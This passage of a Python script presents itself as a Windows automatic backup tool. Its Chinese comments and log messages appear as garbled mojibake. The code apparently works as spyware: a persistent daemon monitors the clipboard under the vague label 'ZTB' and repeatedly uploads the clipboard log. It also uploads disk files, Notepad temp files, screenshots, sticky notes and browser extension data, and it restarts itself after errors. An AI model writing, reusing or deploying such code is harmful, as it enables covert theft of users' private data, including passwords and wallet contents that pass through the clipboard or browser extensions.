        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸ºç©ºï¼Œè·³è¿‡: {log_file}")
            return
            
        # åˆ›å»ºä¸´æ—¶ç›®å½•
        temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, 'temp', 'backup_logs')
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("âŒ æ— æ³•åˆ›å»ºä¸´æ—¶æ—¥å¿—ç›®å½•")
            return
            
        # åˆ›å»ºå¸¦æ—¶é—´æˆ³çš„å¤‡ä»½æ–‡ä»¶å
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"backup_log_{timestamp}.txt"
        backup_path = os.path.join(temp_dir, backup_name)
        
        # å¤åˆ¶æ—¥å¿—æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•
        try:
            # è¯»å–å½“å‰æ—¥å¿—å†…å®¹
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("âš ï¸ æ—¥å¿—å†…å®¹ä¸ºç©ºï¼Œè·³è¿‡ä¸Šä¼ ")
                return
                
            # å†™å…¥å¤‡ä»½æ–‡ä»¶
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # éªŒè¯å¤‡ä»½æ–‡ä»¶æ˜¯å¦åˆ›å»ºæˆåŠŸ
            if not os.path.exists(backup_path) or os.path.getsize(backup_path) == 0:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—æ–‡ä»¶åˆ›å»ºå¤±è´¥æˆ–ä¸ºç©º")
                return
                
            # ä¸Šä¼ æ—¥å¿—æ–‡ä»¶
            logging.info(f"ğŸ“¤ å¼€å§‹ä¸Šä¼ å¤‡ä»½æ—¥å¿—æ–‡ä»¶ ({os.path.getsize(backup_path) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # ä¸Šä¼ æˆåŠŸåæ¸…ç©ºåŸå§‹æ—¥å¿—æ–‡ä»¶ï¼Œåªä¿ç•™ä¸€æ¡è®°å½•
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== ğŸ“ å¤‡ä»½æ—¥å¿—å·²äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼  ===\n")
                    logging.info("âœ… å¤‡ä»½æ—¥å¿—ä¸Šä¼ æˆåŠŸå¹¶å·²æ¸…ç©º")
                except Exception as e:
                    logging.error(f"âŒ å¤‡ä»½æ—¥å¿—æ›´æ–°å¤±è´¥: {e}")
            else:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—ä¸Šä¼ å¤±è´¥")
                
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"âŒ å¤åˆ¶æˆ–è¯»å–æ—¥å¿—æ–‡ä»¶å¤±è´¥: {e}")
        except Exception as e:
            logging.error(f"âŒ å¤„ç†æ—¥å¿—æ–‡ä»¶æ—¶å‡ºé”™: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
            
        # æ¸…ç†ä¸´æ—¶ç›®å½•
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
                
    except Exception as e:
        logging.error(f"âŒ å¤„ç†å¤‡ä»½æ—¥å¿—æ—¶å‡ºé”™: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def periodic_backup_upload(backup_manager):
    """å®šæœŸæ‰§è¡Œå¤‡ä»½å’Œä¸Šä¼ """
    # ä½¿ç”¨æ–°çš„å¤‡ä»½ç›®å½•è·¯å¾„
    clipboard_log_path = os.path.join(backup_manager.config.BACKUP_ROOT, "clipboard_log.txt")
    
    # å¯åŠ¨ZTBç›‘æ§çº¿ç¨‹
    clipboard_monitor_thread = threading.Thread(
        target=backup_manager.monitor_clipboard,
        args=(clipboard_log_path, backup_manager.config.CLIPBOARD_CHECK_INTERVAL),
        daemon=True
    )
    clipboard_monitor_thread.start()
    logging.critical("ğŸ“‹ ZTBç›‘æ§çº¿ç¨‹å·²å¯åŠ¨")
    
    # å¯åŠ¨ZTBä¸Šä¼ çº¿ç¨‹
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    logging.critical("ğŸ“¤ ZTBä¸Šä¼ çº¿ç¨‹å·²å¯åŠ¨")
    
    # åˆå§‹åŒ–ZTBæ—¥å¿—æ–‡ä»¶
    try:
        os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
            f.write(f"=== ğŸ“‹ ZTBç›‘æ§å¯åŠ¨äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except Exception as e:
        logging.error(f"âŒ åˆå§‹åŒ–ZTBæ—¥å¿—å¤±è´¥: {e}")

    # è·å–ç”¨æˆ·å
    username = getpass.getuser()
    current_time = datetime.now()
    logging.critical("\n" + "="*40)
    logging.critical(f"ğŸ‘¤ ç”¨æˆ·: {username}")
    logging.critical(f"ğŸš€ è‡ªåŠ¨å¤‡ä»½ç³»ç»Ÿå·²å¯åŠ¨  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
    logging.critical("ğŸ“‹ ZTBç›‘æ§å’Œè‡ªåŠ¨ä¸Šä¼ å·²å¯åŠ¨")
    logging.critical("="*40)

    def read_next_backup_time():
        """è¯»å–ä¸‹æ¬¡å¤‡ä»½æ—¶é—´"""
        try:
            if os.path.exists(backup_manager.config.THRESHOLD_FILE):
                with open(backup_manager.config.THRESHOLD_FILE, 'r') as f:
                    time_str = f.read().strip()
                    return datetime.strptime(time_str, '%Y-%m-%d %H:%M:%S')
            return None
        except Exception:
            return None

    def write_next_backup_time():
        """å†™å…¥ä¸‹æ¬¡å¤‡ä»½æ—¶é—´"""
        try:
            next_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
            os.makedirs(os.path.dirname(backup_manager.config.THRESHOLD_FILE), exist_ok=True)
            with open(backup_manager.config.THRESHOLD_FILE, 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"å†™å…¥ä¸‹æ¬¡å¤‡ä»½æ—¶é—´å¤±è´¥: {e}")
            return None

    def should_backup_now():
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½"""
        next_backup_time = read_next_backup_time()
        if next_backup_time is None:
            return True
        return datetime.now() >= next_backup_time

    while True:
        try:
            if should_backup_now():
                current_time = datetime.now()
                logging.critical("\n" + "="*40)
                logging.critical(f"â° å¼€å§‹å¤‡ä»½  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                logging.critical("-"*40)
                
                backup_success = True
                
                # è·å–å½“å‰å¯ç”¨çš„ç£ç›˜
                available_disks = get_available_disks()
                
                # æ‰§è¡Œå¤‡ä»½ä»»åŠ¡
                logging.critical("\nğŸ’¾ ç£ç›˜å¤‡ä»½")
                if not backup_disks(backup_manager, available_disks):
                    backup_success = False
                
                logging.critical("\nğŸªŸ Windowsæ•°æ®å¤‡ä»½")
                if not backup_windows_data(backup_manager):
                    backup_success = False
                
                # åœ¨å¤‡ä»½å®Œæˆåä¸Šä¼ æ—¥å¿—
                logging.critical("\nğŸ“ æ­£åœ¨ä¸Šä¼ å¤‡ä»½æ—¥å¿—...")
                try:
                    backup_and_upload_logs(backup_manager)
                except Exception as e:
                    logging.error(f"âŒ æ—¥å¿—å¤‡ä»½ä¸Šä¼ å¤±è´¥: {e}")
                    backup_success = False
                
                # å†™å…¥ä¸‹æ¬¡å¤‡ä»½æ—¶é—´
                next_backup_time = write_next_backup_time()
                
                if backup_success:
                    logging.critical("\n" + "="*40)
                    logging.critical(f"âœ… å¤‡ä»½å®Œæˆ  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40)
                    logging.critical("ğŸ“‹ å¤‡ä»½ä»»åŠ¡å·²ç»“æŸ")
                    if next_backup_time:
                        logging.critical(f"ğŸ”„ ä¸‹æ¬¡å¯åŠ¨å¤‡ä»½æ—¶é—´: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
                else:
                    logging.critical("\n" + "="*40)
                    logging.critical("âŒ éƒ¨åˆ†å¤‡ä»½ä»»åŠ¡å¤±è´¥")
                    logging.critical("="*40)
                    logging.critical("ğŸ“‹ å¤‡ä»½ä»»åŠ¡å·²ç»“æŸ")
                    if next_backup_time:
                        logging.critical(f"ğŸ”„ ä¸‹æ¬¡å¯åŠ¨å¤‡ä»½æ—¶é—´: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
            
            # æ¯å°æ—¶æ£€æŸ¥ä¸€æ¬¡æ˜¯å¦éœ€è¦å¤‡ä»½
            time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)

        except Exception as e:
            logging.error(f"\nâŒ å¤‡ä»½å‡ºé”™: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error(f"âŒ æ—¥å¿—å¤‡ä»½å¤±è´¥: {log_error}")
            # å‘ç”Ÿé”™è¯¯æ—¶ä¹Ÿæ›´æ–°ä¸‹æ¬¡å¤‡ä»½æ—¶é—´
            write_next_backup_time()
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

def backup_disks(backup_manager, available_disks):
    """å¤‡ä»½å¯ç”¨ç£ç›˜
    
    Returns:
        bool: æ‰€æœ‰å¤‡ä»½ä»»åŠ¡æ˜¯å¦æˆåŠŸå®Œæˆ
    """
    all_success = True
    for disk_letter, disk_configs in available_disks.items():
        logging.info(f"\næ­£åœ¨å¤„ç†ç£ç›˜ {disk_letter.upper()}")
        for backup_type, (source_dir, target_dir, ext_type) in disk_configs.items():
            try:
                backup_dir = backup_manager.backup_disk_files(source_dir, target_dir, ext_type)
                if backup_dir:
                    backup_path = backup_manager.zip_backup_folder(
                        backup_dir, 
                        str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
                    )
                    if backup_path:
                        if backup_manager.upload_backup(backup_path):
                            logging.critical(f"â˜‘ï¸ {disk_letter.upper()}ç›˜ {backup_type} å¤‡ä»½å®Œæˆ\n")
                        else:
                            logging.error(f"âŒ {disk_letter.upper()}ç›˜ {backup_type} å¤‡ä»½å¤±è´¥\n")
                            all_success = False
                    else:
                        logging.error(f"âŒ {disk_letter.upper()}ç›˜ {backup_type} å‹ç¼©å¤±è´¥\n")
                        all_success = False
                else:
                    logging.error(f"âŒ {disk_letter.upper()}ç›˜ {backup_type} å¤‡ä»½å¤±è´¥\n")
                    all_success = False
            except Exception as e:
                logging.error(f"âŒ {disk_letter.upper()}ç›˜ {backup_type} å¤‡ä»½å‡ºé”™: {str(e)}\n")
                all_success = False
    
    return all_success

def backup_windows_data(backup_manager):
    """å¤‡ä»½Windowsç³»ç»Ÿæ•°æ®
    
    Args:
        backup_manager: å¤‡ä»½ç®¡ç†å™¨å®ä¾‹
        
    Returns:
        bool: æ‰€æœ‰Windowsæ•°æ®å¤‡ä»½ä»»åŠ¡æ˜¯å¦æˆåŠŸå®Œæˆ
    """
    all_success = True
    try:
        # å¤‡ä»½è®°äº‹æœ¬ä¸´æ—¶æ–‡ä»¶
        notepad_backup = backup_notepad_temp(backup_manager)
        if notepad_backup:
            backup_path = backup_manager.zip_backup_folder(
                notepad_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"notepad_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if backup_manager.upload_backup(backup_path):
                    logging.critical("â˜‘ï¸ è®°äº‹æœ¬ä¸´æ—¶æ–‡ä»¶å¤‡ä»½å®Œæˆ\n")
                else:
                    logging.error("âŒ è®°äº‹æœ¬ä¸´æ—¶æ–‡ä»¶å¤‡ä»½å¤±è´¥\n")
                    all_success = False
            else:
                logging.error("âŒ è®°äº‹æœ¬ä¸´æ—¶æ–‡ä»¶å‹ç¼©å¤±è´¥\n")
                all_success = False
        else:
            logging.error("âŒ è®°äº‹æœ¬ä¸´æ—¶æ–‡ä»¶æ”¶é›†å¤±è´¥\n")
            all_success = False
        
        # å¤‡ä»½æˆªå›¾æ–‡ä»¶
        screenshots_backup = backup_screenshots()
        if screenshots_backup:
            backup_path = backup_manager.zip_backup_folder(
                screenshots_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"screenshots_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if backup_manager.upload_backup(backup_path):
                    logging.critical("â˜‘ï¸ æˆªå›¾æ–‡ä»¶å¤‡ä»½å®Œæˆ\n")
                else:
                    logging.error("âŒ æˆªå›¾æ–‡ä»¶å¤‡ä»½å¤±è´¥\n")
                    all_success = False
            else:
                logging.error("âŒ æˆªå›¾æ–‡ä»¶å‹ç¼©å¤±è´¥\n")
                all_success = False
        else:
            logging.error("âŒ æˆªå›¾æ–‡ä»¶æ”¶é›†å¤±è´¥\n")
            all_success = False
        
        # å¤‡ä»½ä¾¿ç­¾ä¸æµè§ˆå™¨æ‰©å±•æ•°æ®
        sticky_notes_backup = backup_sticky_notes_and_browser_extensions(backup_manager)
        if sticky_notes_backup:
            backup_path = backup_manager.zip_backup_folder(
                sticky_notes_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"sticky_notes_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if backup_manager.upload_backup(backup_path):
                    logging.critical("â˜‘ï¸ ä¾¿ç­¾æ•°æ®å¤‡ä»½å®Œæˆ\n")
                else:
                    logging.error("âŒ ä¾¿ç­¾æ•°æ®å¤‡ä»½å¤±è´¥\n")
                    all_success = False
            else:
                logging.error("âŒ ä¾¿ç­¾æ•°æ®å‹ç¼©å¤±è´¥\n")
                all_success = False
        else:
            logging.error("âŒ ä¾¿ç­¾æ•°æ®æ”¶é›†å¤±è´¥\n")
            all_success = False
                    
        return all_success
        
    except Exception:
        logging.error("Windowsæ•°æ®å¤‡ä»½å¤±è´¥")
        return False

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """ç‹¬ç«‹çš„ZTBä¸Šä¼ çº¿ç¨‹"""
    last_upload_time = datetime.now()
    min_content_size = 100  # æœ€å°å†…å®¹å¤§å°ï¼ˆå­—èŠ‚ï¼‰
    
    while True:
        try:
            current_time = datetime.now()
            
            # æ£€æŸ¥æ˜¯å¦éœ€è¦ä¸Šä¼ ï¼ˆæ ¹æ®é…ç½®çš„é—´éš”æ—¶é—´ï¼‰
            if (current_time - last_upload_time).total_seconds() >= backup_manager.config.CLIPBOARD_INTERVAL:
                if os.path.exists(clipboard_log_path):
                    try:
                        # æ£€æŸ¥æ–‡ä»¶å¤§å°
                        file_size = os.path.getsize(clipboard_log_path)
                        if file_size > min_content_size:  # åªæœ‰å½“å†…å®¹è¶³å¤Ÿæ—¶æ‰ä¸Šä¼ 
                            # æ£€æŸ¥æ–‡ä»¶å†…å®¹
                            with open(clipboard_log_path, 'r', encoding='utf-8') as f:
                                content = f.read().strip()
                                # æ£€æŸ¥æ˜¯å¦åªåŒ…å«å¯åŠ¨ä¿¡æ¯æˆ–ä¸Šä¼ è®°å½•
                                only_status_info = all(line.startswith('=== ğŸ“‹') for line in content.split('\n') if line.strip())
                                
                                if not only_status_info:
                                    # åˆ›å»ºä¸´æ—¶ç›®å½•
                                    temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, 'temp', 'clipboard_logs')
                                    if backup_manager._ensure_directory(str(temp_dir)):
                                        # åˆ›å»ºå¸¦æ—¶é—´æˆ³çš„å¤‡ä»½æ–‡ä»¶å
                                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                        backup_name = f"clipboard_log_{timestamp}.txt"
                                        backup_path = os.path.join(temp_dir, backup_name)
                                        
                                        try:
                                            # å¤åˆ¶æ—¥å¿—æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•
                                            shutil.copy2(clipboard_log_path, backup_path)
                                                
                                            # ä¸Šä¼ æ—¥å¿—æ–‡ä»¶
                                            if backup_manager.upload_file(str(backup_path)):
                                                # ä¸Šä¼ æˆåŠŸåæ¸…ç©ºåŸå§‹æ—¥å¿—æ–‡ä»¶
                                                try:
                                                    with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                                        f.write(f"=== ğŸ“‹ æ—¥å¿—å·²äº {current_time.strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼ å¹¶æ¸…ç©º ===\n")
                                                    last_upload_time = current_time
                                                except Exception as e:
                                                    logging.error(f"âŒ ZTBæ—¥å¿—æ¸…ç©ºå¤±è´¥: {e}")
                                            else:
                                                logging.error("âŒ ZTBæ—¥å¿—ä¸Šä¼ å¤±è´¥")
                                        except Exception as e:
                                            logging.error(f"âŒ å¤åˆ¶ZTBæ—¥å¿—å¤±è´¥: {e}")
                                        finally:
                                            # æ¸…ç†ä¸´æ—¶ç›®å½•
                                            try:
                                                if os.path.exists(str(temp_dir)):
                                                    shutil.rmtree(str(temp_dir))
                                            except Exception as e:
                                                logging.error(f"âŒ æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
                    except Exception as e:
                        logging.error(f"âŒ è¯»å–ZTBæ—¥å¿—æ–‡ä»¶å¤±è´¥: {e}")
                        
        except Exception as e:
            logging.error(f"âŒ å¤„ç†ZTBæ—¥å¿—æ—¶å‡ºé”™: {e}")
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)
            continue
            
        # ç­‰å¾…ä¸€å°æ®µæ—¶é—´å†æ£€æŸ¥
        time.sleep(backup_manager.config.CLIPBOARD_UPLOAD_CHECK_INTERVAL)

def clean_backup_directory():
    """æ¸…ç†å¤‡ä»½ç›®å½•ï¼Œä½†ä¿ç•™æ—¥å¿—æ–‡ä»¶å’Œæ—¶é—´é˜ˆå€¼æ–‡ä»¶"""
    backup_dir = os.path.expandvars('%USERPROFILE%\\Documents\\AutoBackup')
    try:
        if not os.path.exists(backup_dir):
            return
            
        # éœ€è¦ä¿ç•™çš„æ–‡ä»¶
        keep_files = ["backup.log", "clipboard_log.txt", "next_backup_time.txt"]
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"ğŸ—‘ï¸ å·²æ¸…ç†: {item}")
            except Exception as e:
                logging.error(f"âŒ æ¸…ç† {item} å¤±è´¥: {e}")
                
        logging.critical("ğŸ§¹ å¤‡ä»½ç›®å½•å·²æ¸…ç†å®Œæˆ")
    except Exception as e:
        logging.error(f"âŒ æ¸…ç†å¤‡ä»½ç›®å½•æ—¶å‡ºé”™: {e}")

def main():
    """ä¸»å‡½æ•°"""
    try:
        # æ£€æŸ¥æ˜¯å¦å·²ç»æœ‰å®ä¾‹åœ¨è¿è¡Œ
        pid_file = os.path.join(BackupConfig.BACKUP_ROOT, 'backup.pid')
        if os.path.exists(pid_file):
            with open(pid_file, 'r') as f:
                old_pid = int(f.read().strip())
                try:
                    os.kill(old_pid, 0)
                    print(f'å¤‡ä»½ç¨‹åºå·²ç»åœ¨è¿è¡Œ (PID: {old_pid})')
                    return
                except OSError:
                    pass
        
        # å†™å…¥å½“å‰è¿›ç¨‹PID
        os.makedirs(os.path.dirname(pid_file), exist_ok=True)
        with open(pid_file, 'w') as f:
            f.write(str(os.getpid()))
            
        # æ³¨æ„ï¼šæ—¥å¿—é…ç½®åœ¨ BackupManager.__init__ ä¸­è¿›è¡Œï¼Œæ— éœ€é‡å¤é…ç½®
        
        # æ£€æŸ¥ç£ç›˜ç©ºé—´
        try:
            backup_drive = os.path.splitdrive(BackupConfig.BACKUP_ROOT)[0]
            free_space = shutil.disk_usage(backup_drive).free
            if free_space < BackupConfig.MIN_FREE_SPACE:
                logging.warning(f'å¤‡ä»½é©±åŠ¨å™¨ç©ºé—´ä¸è¶³: {free_space / (1024*1024*1024):.2f}GB')
        except (OSError, IOError) as e:
            logging.warning(f'æ— æ³•æ£€æŸ¥ç£ç›˜ç©ºé—´: {str(e)}')
        
        try:
            # åˆ›å»ºå¤‡ä»½ç®¡ç†å™¨å®ä¾‹
            backup_manager = BackupManager()
            
            # æ¸…ç†æ—§çš„å¤‡ä»½ç›®å½•
            clean_backup_directory()
            
            # å¯åŠ¨å®šæœŸå¤‡ä»½å’Œä¸Šä¼ 
            periodic_backup_upload(backup_manager)
                
        except KeyboardInterrupt:
            logging.info('å¤‡ä»½ç¨‹åºè¢«ç”¨æˆ·ä¸­æ–­')
        except Exception as e:
            logging.error(f'å¤‡ä»½è¿‡ç¨‹å‘ç”Ÿé”™è¯¯: {str(e)}')
            # å‘ç”Ÿé”™è¯¯æ—¶ç­‰å¾…ä¸€æ®µæ—¶é—´åé‡è¯•
            time.sleep(BackupConfig.MAIN_ERROR_RETRY_DELAY)
            main()  # é‡æ–°å¯åŠ¨ä¸»ç¨‹åº
            
    finally:
        # æ¸…ç†PIDæ–‡ä»¶
        try:
            if os.path.exists(pid_file):
                os.remove(pid_file)
        except Exception as e:
            logging.error(f'æ¸…ç†PIDæ–‡ä»¶å¤±è´¥: {str(e)}')

if __name__ == "__main__":
    main()